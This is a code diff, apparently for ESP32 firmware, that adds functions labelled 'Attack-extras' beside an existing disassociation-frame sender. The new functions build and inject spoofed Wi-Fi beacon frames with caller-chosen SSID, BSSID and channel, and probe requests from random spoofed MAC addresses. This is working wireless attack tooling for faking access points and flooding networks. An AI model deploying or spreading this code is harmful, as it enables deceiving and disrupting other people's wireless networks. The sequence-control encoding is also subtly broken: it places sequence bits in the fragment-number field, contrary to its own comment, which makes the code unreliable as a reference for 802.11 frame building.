@@ -109,4 +109,82 @@ bool sendDisassocFrame(const uint8_t* bssid, uint8_t channel, const uint8_t* sta
     return (result == ESP_OK);
 }
 
+// ---- Attack-extras frame builders (mirrored in test/mocks/testable_functions.h) ----
+
+static uint16_t beaconSeq = 0;  // shared seq counter for spoofed mgmt frames
+static const uint8_t kRatesIE[10] = {
+    0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24
+};
+
+// Spoofed beacon: broadcast DA, SSID/bssid/channel fully caller-controlled.
+static size_t buildBeaconFrame(uint8_t* out, size_t cap, const char* ssid,
+                               uint8_t ssidLen, const uint8_t bssid[6],
+                               uint8_t channel, uint16_t seq) {
+    const size_t need = 24 /*hdr*/ + 12 /*fixed*/ + 2 + ssidLen +
+                        3 /*DS*/ + sizeof(kRatesIE);
+    if (!out || cap < need || ssidLen > 32) return 0;
+
+    size_t n = 0;
+    out[n++] = 0x80; out[n++] = 0x00;      // FC: beacon
+    out[n++] = 0x00; out[n++] = 0x00;      // duration
+    memset(out + n, 0xFF, 6); n += 6;      // DA broadcast
+    memcpy(out + n, bssid, 6); n += 6;     // SA = spoofed AP
+    memcpy(out + n, bssid, 6); n += 6;     // BSSID
+    out[n++] = (uint8_t)((seq & 0x0F));         // seq-ctl low: seq bits 3:0,
+    out[n++] = (uint8_t)((seq >> 4) & 0xFF);    // fragment nibble stays zero
+    memset(out + n, 0x00, 8); n += 8;      // timestamp
+    out[n++] = 0x64; out[n++] = 0x00;      // beacon interval 100 TU
+    out[n++] = 0x21; out[n++] = 0x00;      // capability: ESS
+    out[n++] = 0x00; out[n++] = ssidLen;   // SSID IE
+    memcpy(out + n, ssid, ssidLen); n += ssidLen;
+    out[n++] = 0x03; out[n++] = 0x01; out[n++] = channel;  // DS param
+    memcpy(out + n, kRatesIE, sizeof(kRatesIE)); n += sizeof(kRatesIE);
+    return n;
+}
+
+// Broadcast probe request looking for the given SSID.
+static size_t buildProbeReqFrame(uint8_t* out, size_t cap, const char* ssid,
+                                 uint8_t ssidLen, const uint8_t src[6],
+                                 uint16_t seq) {
+    const size_t need = 24 /*hdr*/ + 2 + ssidLen + sizeof(kRatesIE);
+    if (!out || cap < need || ssidLen > 32) return 0;
+
+    size_t n = 0;
+    out[n++] = 0x40; out[n++] = 0x00;      // FC: probe request
+    out[n++] = 0x00; out[n++] = 0x00;
+    memset(out + n, 0xFF, 6); n += 6;      // DA broadcast
+    memcpy(out + n, src, 6); n += 6;       // SA
+    memset(out + n, 0xFF, 6); n += 6;      // BSSID wildcard
+    out[n++] = (uint8_t)((seq & 0x0F));
+    out[n++] = (uint8_t)((seq >> 4) & 0xFF);
+    out[n++] = 0x00; out[n++] = ssidLen;
+    memcpy(out + n, ssid, ssidLen); n += ssidLen;
+    memcpy(out + n, kRatesIE, sizeof(kRatesIE)); n += sizeof(kRatesIE);
+    return n;
+}
+
+bool sendBeaconFrame(const char* ssid, uint8_t ssidLen,
+                     const uint8_t bssid[6], uint8_t channel) {
+    uint8_t frame[128];
+    size_t n = buildBeaconFrame(frame, sizeof(frame), ssid, ssidLen, bssid,
+                                channel, beaconSeq++);
+    if (n == 0) return false;
+    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, frame, n, false);
+    return (result == ESP_OK);
+}
+
+bool sendProbeReqFrame(const char* ssid, uint8_t ssidLen, uint8_t channel) {
+    uint8_t src[6];
+    esp_fill_random(src, 6);
+    src[0] = (src[0] & 0xFC) | 0x02;  // locally administered unicast
+    uint8_t frame[128];
+    size_t n = buildProbeReqFrame(frame, sizeof(frame), ssid, ssidLen, src,
+                                  beaconSeq++);
+    if (n == 0) return false;
+    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, frame, n, false);
+    return (result == ESP_OK);
+}
+
 }
